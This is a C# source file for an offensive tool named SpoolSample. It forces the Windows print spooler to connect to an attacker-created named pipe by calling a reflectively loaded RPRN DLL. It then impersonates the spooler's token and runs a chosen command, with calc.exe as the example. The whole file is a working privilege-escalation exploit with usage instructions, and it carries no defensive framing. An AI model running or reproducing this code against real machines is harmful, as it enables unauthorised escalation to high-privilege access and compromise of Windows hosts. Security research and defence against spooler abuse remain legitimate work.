using System;
using System.Text;
using RDI;
using Impersonate;
using System.Threading;
using System.Threading.Tasks;

namespace SpoolSample
{
    class SpoolSample
    {
        // desktop-pouorrf desktop-pouorrf/pipe/test
        // \\.\pipe\test\pipe\spoolss
        // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 

        public static void Inject(String arg, String command)
        {
            Console.WriteLine("Creating Pipe");
            Impersonate.Program.RunImpersonate(arg, command);
        }

        public static void Sample(String arg1, String arg2)
        {
            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{arg1} \\\\{arg2}");
            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
        }
        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Invalid number of args. Syntax: Program.exe TARGET PIPENAME (eg. desktop-pouorrf desktop-pouorrf/pipe/test calc.exe)");
                return;
            }
            String arg1 = args[0];
            String arg2 = args[0] + "/pipe/" + args[1];
            String arg3 = "\\\\.\\pipe\\" + args[1] + "\\pipe\\spoolss";
            String arg4 = args[2];
            Parallel.Invoke(() => Inject(arg3, arg4),
                () => Sample(arg1, arg2));
            Console.WriteLine("Doneee");
        }
    }
}
